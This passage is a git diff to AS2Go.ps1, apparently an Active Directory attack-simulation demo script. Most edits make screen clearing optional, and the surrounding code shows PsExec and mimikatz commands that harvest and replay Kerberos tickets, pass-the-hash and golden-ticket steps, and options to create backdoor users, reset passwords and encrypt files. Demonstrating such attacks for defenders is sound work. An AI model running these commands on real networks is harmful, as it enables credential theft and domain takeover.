+            If (-not $SkipClearHost){Clear-Host}
             Write-Host "____________________________________________________________________`n" 
             Write-Host "         Step 3 of 3 |  make some change for current session        "
             Write-Host "____________________________________________________________________`n"     
@@ -3109,7 +3148,7 @@ Function New-GoldenTicket {
             Pause
         }
 
-        Clear-Host
+        If (-not $SkipClearHost){Clear-Host}
 
         Write-Host "____________________________________________________________________`n" 
         Write-Host "        ??? REPEAT | Attack Level - Golden Ticket Attack  ???           "
@@ -3153,7 +3192,7 @@ function New-KerberoastingAttack {
     #Show-Step -step "step_007.html"
     Do {
 
-        Clear-Host
+        If (-not $SkipClearHost){Clear-Host}
         Write-Host "____________________________________________________________________`n" 
         Write-Host "                 Attack Level -  Kerberoasting Attack               "
         Write-Host ""
@@ -3163,7 +3202,7 @@ function New-KerberoastingAttack {
 
         Start-KerberoastingAttack    
 
-        Clear-Host
+        If (-not $SkipClearHost){Clear-Host}
 
         Write-Host "____________________________________________________________________`n" 
         Write-Host "        ??? REPEAT | Attack Level - Kerberoasting Attack  ???           "
@@ -3437,9 +3476,9 @@ function New-PrivilegeEscalationRecommendation {
     [bool]$condition2 = $true
 
 
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
-    Write-Host "             Choose your type of Privilege Escalation                "
+    Write-Host "             Choose your Type of Privilege Escalation                "
     Write-Host "____________________________________________________________________`n" 
 
 
@@ -3529,19 +3568,19 @@ function New-PrivilegeEscalationRecommendation {
 #>
 
 
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
-    Write-Host "             Choose your type of Privilege Escalation                "
+    Write-Host "             Choose your Type of Privilege Escalation                "
     Write-Host "____________________________________________________________________`n" 
 
-
+    Write-host "     current Victim PC Name & OS:  $overview - " -NoNewline
+    Write-host $version -ForegroundColor Yellow
+    Write-Host
 
     $space = "  "
     Write-Host "`n     ATTACK COMPATIBILITY MATRIX:`n"
 
-    Write-host "     current Victim PC OS:  $overview - " -NoNewline
-    Write-host $version -ForegroundColor Yellow
-    Write-Host
+
     Write-Host "$space           ║        Win 10       |        Win11 "
     Write-Host "$space           ║  $le $workingWinVersion  |  $ge $LimitedWinVersion  |   21H2   | $ge 22H2 "
     Write-Host "$space  ═════════╬══════════════════════════════════════════"
@@ -3555,7 +3594,7 @@ function New-PrivilegeEscalationRecommendation {
     Write-Host "     Pass-the-Ticket attack is therefore possible!" -ForegroundColor Yellow
 
     Write-Host ""
-    Write-Host "`n     CURRENT SITUATION - FROM THE ATTACKER'S PERSPECTIVE:`n" 
+    Write-Host "`n     CURRENT SITUATION - FROM AN ATTACKER'S PERSPECTIVE:`n" 
     
     Write-Host "     TOP: " -NoNewline -ForegroundColor Cyan
     Write-Host "Victim User " -NoNewline
@@ -3585,6 +3624,11 @@ function New-PrivilegeEscalationRecommendation {
         Write-Host "User for currently cached Kerberos tickets is " -NoNewline
         Write-Host "$($client.ToUpper())" -ForegroundColor Yellow
     }
+    elseif ($client.ToUpper().contains("(0)")) {
+        Write-Host "     BAD: " -NoNewline -ForegroundColor Red
+        Write-Host "Currently NO cached Kerberos tickets available " -NoNewline
+        Write-Host "$($client.ToUpper())" -ForegroundColor Yellow
+    }
     else {
         Write-Host "     TOP: " -NoNewline -ForegroundColor Cyan
         Write-Host "Client for currently cached Kerberos tickets is " -NoNewline
@@ -3594,12 +3638,12 @@ function New-PrivilegeEscalationRecommendation {
     If ($bAdminPC) {
         Write-Host "     TOP: " -NoNewline -ForegroundColor Cyan
         Write-Host "Your user has access to " -NoNewline
-        Write-Host "\\$mySAW\c$\temp" -ForegroundColor Yellow
+        Write-Host "\\$mySAW\c$\temp!" -ForegroundColor Yellow
     }
     else {
         Write-Host "     BAD: " -NoNewline -ForegroundColor Red
         Write-Host "Your user does NOT have access to share " -NoNewline
-        Write-Host "\\$mySAW\c$\temp" -ForegroundColor Yellow
+        Write-Host "\\$mySAW\c$\temp!" -ForegroundColor Yellow
     }
 
     [bool]$condition1 = $false
@@ -4040,7 +4084,7 @@ Function Set-NewBackgroundColor {
 
     $a = (Get-Host).UI.RawUI
     $a.BackgroundColor = $BgC
-    $a.ForegroundColor = $FgC ; Clear-Host
+    $a.ForegroundColor = $FgC ; If (-not $SkipClearHost){Clear-Host}
 
     Write-Log -Message "    >> New Color Set $Bgc and $Fgc"
 
@@ -4123,7 +4167,7 @@ function Start-Exfiltration {
     Get-DirContent -Path $OfflineDITFile
 
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
     Write-Host "             try to open cmd console on $myAppServer"
     Write-Host "____________________________________________________________________`n" 
@@ -4154,7 +4198,7 @@ function Start-Exfiltration {
     Write-Host ""
 
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
 
     If ($showStep) { Show-Step step_011.html }
     Update-WindowTitle -NewTitle $stage35
@@ -4192,7 +4236,7 @@ function Start-PtHAttack {
     $myfunction = Get-FunctionName
     Write-Log -Message "### Start Function $myfunction ###"
     #####
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
     Write-Host "           Starting Pass-the-Hash (PtH) Attack on VictimPC          "
     Write-Host "____________________________________________________________________`n" 
@@ -4217,7 +4261,7 @@ function Start-PtHAttack {
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
     If ($showStep) { Show-Step -step "step_poi.html" }
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
 
     Write-Host "____________________________________________________________________`n" 
     Write-Host "  Try to list all recently logged-on user credentials from VictimPC          " 
@@ -4249,7 +4293,7 @@ function Start-PtHAttack {
     }
 
     Do {
-        Clear-Host
+        If (-not $SkipClearHost){Clear-Host}
         Write-Host "____________________________________________________________________`n" 
         Write-Host "                   overpass-the-Hash 'PtH' attack                   "
         Write-Host "____________________________________________________________________`n" 
@@ -4325,7 +4369,7 @@ function Start-PtTAttack {
     Write-Log -Message "### Start Function $myfunction ###"
     #####
     $hostname = $env:computername
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
     Write-Host "           Try to run a Pass-the-Ticket 'PtT' attack                          "
     Write-Host "____________________________________________________________________`n" 
@@ -4336,7 +4380,7 @@ function Start-PtTAttack {
     Write-Host "      Step #3 - run PtT to become Domain Admin"
     Write-host ""
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     # remove all old tickets
     Try {
         #Get-Item \\$hostname\$ticketsUNCPath\*.kirbi
@@ -4348,7 +4392,7 @@ function Start-PtTAttack {
     }
 
 
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
     Write-Host "           stage mimikatz on Admin PC $mySAW                        "  
     Write-Host "____________________________________________________________________`n" 
@@ -4367,7 +4411,7 @@ function Start-PtTAttack {
 
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
 
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
     Write-Host "           harvest tickets on Admin PC $mySAW                      "
     Write-Host "____________________________________________________________________`n" 
@@ -4379,7 +4423,7 @@ function Start-PtTAttack {
     Invoke-Command -ScriptBlock { .\PsExec.exe \\$mySAW -accepteula cmd /c ('cd c:\temp\tickets & mimikatz.exe "privilege::debug" "sekurlsa::tickets /export"  "exit"') }
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
 
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
     Write-Host "            list tickets on Admin PC $mySAW                        "
     Write-Host "____________________________________________________________________`n" 
@@ -4395,7 +4439,7 @@ function Start-PtTAttack {
     Get-Item $files -Force | Out-Host
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
 
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
     Write-Host "  copy $domainadmin tickets from Admin PC '$mySAW' to Victim PC "
     Write-Host "____________________________________________________________________`n" 
@@ -4408,7 +4452,7 @@ function Start-PtTAttack {
 
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
     Remove-Item -Recurse \\$mySAW\$ticketsUNCPath
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
     write-host "     load stolen tickets from $domainadmin on VictimPC"
     write-host "                    to become a Domain Admin"
@@ -4420,10 +4464,10 @@ function Start-PtTAttack {
     Write-Host  ""
 
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Invoke-Command -ScriptBlock { .\mimikatz.exe "privilege::debug" "kerberos::ptt \\$hostname\$ticketsUNCPath" "exit" }
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
     Write-Host "       Displays a list of currently cached Kerberos tickets         "
     Write-Host "____________________________________________________________________`n" 
@@ -4440,7 +4484,7 @@ function Start-PtTAttack {
     
     klist
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
     Write-Host "                 2nd TRY connect to DCs c$ share                    "   
     Write-Host "____________________________________________________________________`n" 
@@ -4450,7 +4494,7 @@ function Start-PtTAttack {
     Get-DirContent -Path $directory
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
 
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
     Write-Host "        2nd TRY to list NetBIOS sessions on Domain Controller       "
     Write-Host "____________________________________________________________________`n" 
@@ -4497,7 +4541,7 @@ function Start-Reconnaissance {
     Get-SensitveADUser -group $GroupDA
 
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
     Write-Host "       TRY to find Domain COMPUTER and connect to one c$ share      "
     Write-Host "____________________________________________________________________`n`n" 
@@ -4533,7 +4577,7 @@ function Start-Reconnaissance {
 
 
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
     Write-Host "            TRY to find DC's and connect to one c$ share            "
     Write-Host "____________________________________________________________________`n`n" 
@@ -4560,7 +4604,7 @@ function Start-ReconnaissanceExtended {
     $myfunction = Get-FunctionName
     Write-Log -Message "### Start Function $myfunction ###"
     ####
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
     Write-Host "TRY to enumerate the members of the Group Policy Creator Owners group         "
     Write-Host "____________________________________________________________________`n" 
@@ -4574,7 +4618,7 @@ function Start-ReconnaissanceExtended {
     Write-Host ""
     Write-Host ""
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
     Write-Host "            TRY to enumerate all Enterprise Admins              "
     Write-Host "____________________________________________________________________`n" 
@@ -4588,7 +4632,7 @@ function Start-ReconnaissanceExtended {
     Get-SensitveADUser -group $GroupEA
     Write-Host ""
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
     Write-Host "            open new window for Domain Zone Transfer                "
     Write-Host "____________________________________________________________________`n" 
@@ -4608,7 +4652,7 @@ function Start-ReconnaissanceExtended {
 
     Start-Process nslookup
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
     Write-Host "          TRY to list NetBIOS sessions on Domain Controller         "
     Write-Host "____________________________________________________________________`n" 
@@ -4994,7 +5038,7 @@ function Start-UserManipulation {
       
     
     
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
     Write-Host "               Try to disable all (DEMO) users                            "
     Write-Host "____________________________________________________________________`n" 
@@ -5021,7 +5065,7 @@ function Start-UserManipulation {
         If ($UnAttended) { Start-Sleep 2 } else { Pause }
     }
 
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
 
     Write-Host "____________________________________________________________________`n" 
     Write-Host "        Try to reset all users password                             "
@@ -5126,7 +5170,7 @@ function Stop-AS2GoDemo {
     Write-Log -Message "### Start Function $myfunction ###"
     #####
 
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
 
     $closing = "DONE!"
     Write-Host $closing -ForegroundColor $global:FGCCommand
@@ -5297,7 +5341,7 @@ Function Start-AS2GoDemo {
     $demo = Get-KeyValue -key "DemoTitle"
     Update-WindowTitle -NewTitle $demo
 
-    # Clear-Host
+    # If (-not $SkipClearHost){Clear-Host}
     Set-NewColorSchema -NewStage $PtT
 
     $laststage = Get-KeyValue -key "LastStage"
@@ -5326,7 +5370,7 @@ Function Start-AS2GoDemo {
         Set-NewColorSchema -NewStage $InitialStart
 
 
-        Clear-Host
+        If (-not $SkipClearHost){Clear-Host}
         Write-Host "____________________________________________________________________`n" 
         Write-Host "        AS2Go.ps1   Version $version              "
         Write-Host "                                                                    "
@@ -5391,7 +5435,7 @@ Function Start-AS2GoDemo {
         ######                                                                     #####
         ################################################################################
 
-        Clear-Host
+        If (-not $SkipClearHost){Clear-Host}
         If ($UnAttended -eq $false) { Get-AS2GoSettings }
 
         ################################################################################
@@ -5407,7 +5451,7 @@ Function Start-AS2GoDemo {
         }
         else {
 
-            Clear-Host
+            If (-not $SkipClearHost){Clear-Host}
             Update-WindowTitle -NewTitle $stage05
             #Set-KeyValue -key "LastStage" -NewValue $stage05
     
@@ -5415,7 +5459,7 @@ Function Start-AS2GoDemo {
             Do {
                 # If ($skipstep) { break }            
                 
-                Clear-Host
+                If (-not $SkipClearHost){Clear-Host}
                 Write-Host "____________________________________________________________________`n" 
                 Write-Host "                   Attack Level - Bruce Force Account                    "
                 Write-Host "           ... in this case, we run a Password Spray Attack ...         "
@@ -5445,7 +5489,7 @@ Function Start-AS2GoDemo {
     
     
     
-                Clear-Host
+                If (-not $SkipClearHost){Clear-Host}
     
                 Write-Host "____________________________________________________________________`n" 
                 Write-Host "        ??? REPEAT | Attack Level - Bruce Force Account  ???             "
@@ -5488,7 +5532,7 @@ Function Start-AS2GoDemo {
     $myAppServer = Get-KeyValue -key "myAppServer"
     $UseCase = Get-KeyValue -key "usecase"
 
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
 
     If ($Begin -eq $yes) {
         $MyInfo = "          Today I use these three (3) user accounts                    "
@@ -5527,7 +5571,7 @@ Function Start-AS2GoDemo {
     }
 
 
-    #Clear-Host
+    #If (-not $SkipClearHost){Clear-Host}
     $victim = "VI-$suffix"
     $helpdeskuser = "HD-$suffix"
     $domainadmin = "DA-$suffix"
@@ -5535,9 +5579,10 @@ Function Start-AS2GoDemo {
 
     Write-Host ""
     Write-Host "  Compromised Account  --  " -NoNewline
-    Write-Host                                  $victim -ForegroundColor $fgcC       
-    Write-Host "  Helpdesk User        --  $helpdeskuser"
-    Write-Host "  Domain Admin         --  $domainadmin"
+    Write-Host                                  $victim -ForegroundColor $fgcC -NoNewline
+    Write-Host " | Tier 2 Account"
+    Write-Host "  Helpdesk User        --  $helpdeskuser | Tier 1 Account"
+    Write-Host "  Domain Admin         --  $domainadmin | Tier 0 Account"
 
     If ($Begin -eq $yes) {
                
@@ -5546,9 +5591,9 @@ Function Start-AS2GoDemo {
         $infoD = Get-ComputerInformation -computer $myDC
         
         Write-Host ""
-        Write-Host "  Victim Maschine      --  $infoV"
-        Write-Host "  Admin Maschine       --  $infoS" 
-        Write-Host "  Domain Controller    --  $infoD" 
+        Write-Host "  Victim Maschine      --  $infoV  | Tier 2 Maschine"
+        Write-Host "  Admin Maschine       --  $infoS  | Tier 0 Maschine" 
+        Write-Host "  Domain Controller    --  $infoD  | Tier 0 Maschine" 
    
         try {
             Write-Output $helpdeskuser | Set-Clipboard
@@ -5623,7 +5668,7 @@ Function Start-AS2GoDemo {
         If ($SkipCompromisedAccount) { break }    
   
 
-        Clear-Host
+        If (-not $SkipClearHost){Clear-Host}
         Write-Host "____________________________________________________________________`n" 
         Write-Host "            Attack Level - COMPROMISED User Account                 "
         Write-Host "                Was this a PRIVLEDGE(!) Account?                    "
@@ -5669,7 +5714,7 @@ Function Start-AS2GoDemo {
         If ($showStep) { Show-Step -step $UserPic }
         Start-NetSess -server $myDC
 
-        Clear-Host
+        If (-not $SkipClearHost){Clear-Host}
         Write-Host "____________________________________________________________________`n" 
         Write-Host "        Starting with $Account User Account        "
         Write-Host "____________________________________________________________________`n" 
@@ -5713,7 +5758,7 @@ Function Start-AS2GoDemo {
     
             Write-Host ""
             Pause
-            Clear-Host
+            If (-not $SkipClearHost){Clear-Host}
             Write-Host "____________________________________________________________________`n" 
             Write-Host "        Displays a list of currently cached Kerberos tickets        "
             Write-Host "____________________________________________________________________`n" 
@@ -5725,7 +5770,7 @@ Function Start-AS2GoDemo {
             Write-Host ""
             klist
             If ($UnAttended) { Start-Sleep 1 } else { Pause }
-            Clear-Host
+            If (-not $SkipClearHost){Clear-Host}
         }
         elseIf ($answer -eq $exit) {
             Stop-AS2GoDemo
@@ -5772,7 +5817,7 @@ Function Start-AS2GoDemo {
         If ($showStep) { Show-Step -step "step_006.html" }
         Do {
             # If ($skipstep) { break }     
-            Clear-Host
+            If (-not $SkipClearHost){Clear-Host}
             Write-Host "____________________________________________________________________`n" 
             Write-Host "                   Attack Level - RECONNAISSANCE                    "
             Write-Host "       try to collect reconnaissance and configuration data         "
@@ -5810,7 +5855,7 @@ Function Start-AS2GoDemo {
             }
     
     
-            Clear-Host
+            If (-not $SkipClearHost){Clear-Host}
     
             Write-Host "____________________________________________________________________`n" 
             Write-Host "        ??? REPEAT | Attack Level - RECONNAISSANCE  ???             "
@@ -5854,7 +5899,7 @@ Function Start-AS2GoDemo {
 
         Do {
             # If ($skipstep) { break }     
-            Clear-Host
+            If (-not $SkipClearHost){Clear-Host}
             Set-NewColorSchema -NewStage $InitialStart
             $PrivilegeEscalation = New-PrivilegeEscalationRecommendation -computer $env:COMPUTERNAME
 
@@ -5917,7 +5962,7 @@ Function Start-AS2GoDemo {
             }
 
 
-            Clear-Host
+            If (-not $SkipClearHost){Clear-Host}
 
             Write-Host "____________________________________________________________________`n" 
             Write-Host "        ??? REPEAT | Privilege Escalation  ???           "
@@ -5957,7 +6002,7 @@ Function Start-AS2GoDemo {
         If ($showStep) { Show-Step -step "step_006.html" }
         Do {
             # If ($skipstep) { break }     
-            Clear-Host
+            If (-not $SkipClearHost){Clear-Host}
             Write-Host "____________________________________________________________________`n" 
             Write-Host "                   Attack Level - RECONNAISSANCE                    "
             Write-Host "       try to collect reconnaissance and configuration data         "
@@ -5973,7 +6018,7 @@ Function Start-AS2GoDemo {
     
             If ($answer -eq $yes) {
         
-                Clear-Host
+                If (-not $SkipClearHost){Clear-Host}
                 Write-Host "____________________________________________________________________`n" 
                 Write-Host "        Show Services and Processes on Logon Server                  "
                 Write-Host "____________________________________________________________________`n"
@@ -6025,7 +6070,7 @@ Function Start-AS2GoDemo {
             }
     
     
-            Clear-Host
+            If (-not $SkipClearHost){Clear-Host}
     
             Write-Host "____________________________________________________________________`n" 
             Write-Host "        ??? REPEAT | Attack Level - RECONNAISSANCE  ???             "
@@ -6066,7 +6111,7 @@ Function Start-AS2GoDemo {
 
         Do {
 
-            Clear-Host
+            If (-not $SkipClearHost){Clear-Host}
 
             Write-Host "____________________________________________________________________`n" 
             Write-Host "                Attack Level - ACCESS SENSITIVE DATA                "
@@ -6089,7 +6134,7 @@ Function Start-AS2GoDemo {
     
             }
 
-            Clear-Host
+            If (-not $SkipClearHost){Clear-Host}
 
             Write-Host "____________________________________________________________________`n" 
             Write-Host "        ??? REPEAT | Attack Level - ACCESS SENSITIVE DATA  ???      "
@@ -6129,7 +6174,7 @@ Function Start-AS2GoDemo {
 
 
             Set-NewColorSchema -NewStage $InitialStart
-            Clear-Host
+            If (-not $SkipClearHost){Clear-Host}
             Write-Host "____________________________________________________________________`n" 
             Write-Host "          Attack Level - DOMAIN COMPROMISED AND PERSISTENCE         "
             Write-Host "____________________________________________________________________`n" 
@@ -6137,14 +6182,14 @@ Function Start-AS2GoDemo {
             Write-Host "   Choose your attack: `n"
 
           #  Write-Host "   S " -ForegroundColor Yellow -NoNewline; Write-Host "- to show Services and Processes on Logon Server`n"  
-            Write-Host "   B " -ForegroundColor Yellow -NoNewline; Write-Host "- to create a backdoor user"
+            Write-Host "   B " -ForegroundColor Yellow -NoNewline; Write-Host "- to create a Backdoor User"
             Write-Host "   T " -ForegroundColor Yellow -NoNewline; Write-Host "- to manipulate Group Policy Templates (GPT) files" -NoNewline; Write-Host "   **** NEW ****" -ForegroundColor Yellow
-            Write-Host "   D " -ForegroundColor Yellow -NoNewline; Write-Host "- to disable all users, except for the backdoor user"
-            Write-Host "     " -ForegroundColor Yellow -NoNewline; Write-Host "  (and reset all user passwords, except for the backdoor user)"
-            Write-Host "   E " -ForegroundColor Yellow -NoNewline; Write-Host "- to encrypt (backup) files on Domain Controller"
-            Write-Host "   K " -ForegroundColor Yellow -NoNewline; Write-Host "- to export the DPAPI master key"
-            Write-Host "   G " -ForegroundColor Yellow -NoNewline; Write-Host "- to create a golden ticket"
-            Write-Host "   R " -ForegroundColor Yellow -NoNewline; Write-Host "- to reboot all (available) machines"  
+            Write-Host "   D " -ForegroundColor Yellow -NoNewline; Write-Host "- to disable all Users except for the Backdoor User"
+            Write-Host "     " -ForegroundColor Yellow -NoNewline; Write-Host "  (and reset all User passwords except for the backdoor user)"
+            Write-Host "   E " -ForegroundColor Yellow -NoNewline; Write-Host "- to encrypt (backup) Files on Domain Controller"
+            Write-Host "   K " -ForegroundColor Yellow -NoNewline; Write-Host "- to export the DPAPI master Key"
+            Write-Host "   G " -ForegroundColor Yellow -NoNewline; Write-Host "- to create a Golden Ticket"
+            Write-Host "   R " -ForegroundColor Yellow -NoNewline; Write-Host "- to reboot all (available) Machines"  
             Write-Host "`n   X " -ForegroundColor Yellow -NoNewline; Write-Host "- to Exit AS2Go"  
 
             If ($UnAttended) {
@@ -6159,7 +6204,7 @@ Function Start-AS2GoDemo {
             switch ($answer) {
 
                 "B" {
-                    Clear-Host
+                    If (-not $SkipClearHost){Clear-Host}
                     Write-Host "____________________________________________________________________`n" 
                     Write-Host "        Create a backdoor USER and add it to Sensitive Groups           "
                     Write-Host "____________________________________________________________________`n"     
@@ -6180,7 +6225,7 @@ Function Start-AS2GoDemo {
                     $repeat = $yes 
                 }
                 "T" {
-                    Clear-Host
+                    If (-not $SkipClearHost){Clear-Host}
                     Write-Host "____________________________________________________________________`n" 
                     Write-Host "        Manipulate Group Policy Templates (GPT) files           "
                     Write-Host "____________________________________________________________________`n"     
@@ -6206,7 +6251,7 @@ Function Start-AS2GoDemo {
                     $repeat = $yes  
                 }
                 "D" {
-                    Clear-Host
+                    If (-not $SkipClearHost){Clear-Host}
                     Write-Host "____________________________________________________________________`n" 
                     Write-Host "            User Manipulation - Disable & PW reset                   "
                     Write-Host "____________________________________________________________________`n" 
@@ -6236,7 +6281,7 @@ Function Start-AS2GoDemo {
                     $repeat = $yes   
                 }
                 "G" {
-                    Clear-Host
+                    If (-not $SkipClearHost){Clear-Host}
                     Write-Host "____________________________________________________________________`n" 
                     Write-Host "        create golden ticket for an unknown user                    "
                     Write-Host "____________________________________________________________________`n"     
@@ -6259,7 +6304,7 @@ Function Start-AS2GoDemo {
                 "E" {
                     #region  Step - ran ransomware attack? 
                     #Pause
-                    Clear-Host
+                    If (-not $SkipClearHost){Clear-Host}
                     Write-Host "____________________________________________________________________`n" 
                     Write-Host "                 ran ransomware attack?                               "
                     Write-Host "____________________________________________________________________`n"     
@@ -6282,7 +6327,7 @@ Function Start-AS2GoDemo {
                 }
                 "K" {
                     #region Step - export DATA PROTECTION API master key
-                    Clear-Host
+                    If (-not $SkipClearHost){Clear-Host}
                     Write-Host "____________________________________________________________________`n" 
                     Write-Host "        try to export DATA PROTECTION API master key                "
                     Write-Host ""
@@ -6319,7 +6364,7 @@ Function Start-AS2GoDemo {
                 }
                 "R" {
                     #Pause
-                    Clear-Host
+                    If (-not $SkipClearHost){Clear-Host}
                     Write-Host "____________________________________________________________________`n" 
                     Write-Host "                 reboot (all machines)                              "
                     Write-Host "____________________________________________________________________`n"     
@@ -6340,7 +6385,7 @@ Function Start-AS2GoDemo {
                     $repeat = $yes  
                 }
                 "S" {
-                    Clear-Host
+                    If (-not $SkipClearHost){Clear-Host}
                     Write-Host "____________________________________________________________________`n" 
                     Write-Host "        Show Services and Processes on Logon Server                  "
                     Write-Host "____________________________________________________________________`n"
@@ -6388,7 +6433,7 @@ Function Start-AS2GoDemo {
 
 
 
-            Clear-Host
+            If (-not $SkipClearHost){Clear-Host}
 
             Write-Host "____________________________________________________________________`n" 
             Write-Host "        ??? REPEAT | Attack Level - DOMAIN COMPROMISED ???          "
